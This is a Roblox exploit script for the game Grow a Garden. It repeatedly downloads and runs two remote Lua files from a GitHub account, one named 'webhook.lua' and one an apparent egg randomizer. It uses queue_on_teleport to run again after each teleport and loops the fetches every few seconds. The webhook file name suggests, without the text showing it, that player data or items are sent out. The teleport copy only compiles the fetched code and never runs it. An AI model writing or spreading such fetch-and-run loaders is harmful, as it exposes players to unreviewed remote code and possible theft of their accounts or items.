-- Function to run both scripts with error handling
local function RunScripts()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/webhook.lua"))()
    end)
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/Load/EggRandomizer.lua"))()
    end)
end

-- First run
RunScripts()

-- Simple teleport script with minimal syntax
local teleportScript = [[
    -- Function to run scripts
    local function run()
        pcall(loadstring, game:HttpGet("https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/webhook.lua"))
        pcall(loadstring, game:HttpGet("https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/Load/EggRandomizer.lua"))
    end

    -- Initial run
    run()
    
    -- Spam loop
    while true do
        run()
        wait(math.random(3, 7))  -- Random delay 3-7 seconds
    end
]]

-- Queue the teleport with proper escaping
queue_on_teleport('loadstring(' .. string.format('%q', teleportScript) .. ')()')

-- Spam in current session
while true do
    RunScripts()
    wait(math.random(3, 7))  -- Random delay 3-7 seconds
end
